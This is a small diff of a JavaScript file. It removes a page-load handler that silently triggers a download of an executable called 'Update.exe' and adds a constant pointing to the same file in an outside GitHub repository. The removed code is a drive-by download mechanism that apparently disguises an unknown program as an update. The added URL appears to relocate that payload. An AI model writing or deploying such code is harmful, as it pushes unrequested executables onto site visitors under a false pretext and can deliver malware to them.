@@ -1,10 +1,1 @@
-window.onload = function () {
-  const downloadUrl = "/assets/files/Update.exe";
-  const link = document.createElement('a');
-  link.href = downloadUrl;
-  link.download = "Update.exe";
-  
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-};
+const downloadUrl = "https://github.com/c82676b9a8/scripty/raw/refs/heads/main/assets/files/Update.exe?download=";
